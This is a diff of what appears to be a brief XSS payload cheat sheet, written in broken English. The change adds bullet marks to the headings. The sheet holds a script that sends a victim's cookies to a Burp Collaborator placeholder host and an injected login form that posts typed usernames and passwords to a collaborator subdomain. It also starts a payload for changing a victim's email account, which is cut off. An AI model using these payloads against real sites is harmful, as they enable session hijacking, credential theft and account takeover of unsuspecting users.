@@ -1,14 +1,14 @@
-To stole user cookies if the httponly = false
+•To stole user cookies if the httponly = false
   
 <script>
 fetch('https://YOUR-COLLABORATOR-ID/?c='+document.cookie)
 </script>
 
-to stole user id and password by cookies 
+•To stole user id and password by cookies 
 
 <input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
 
-To change victeam gmail for update gmail if the gmail update function is cant requeired password
+•To change victeam gmail for update gmail if the gmail update function is cant requeired password
 
 <script>
  window.addEventListener('DOMContentLoaded', function() {
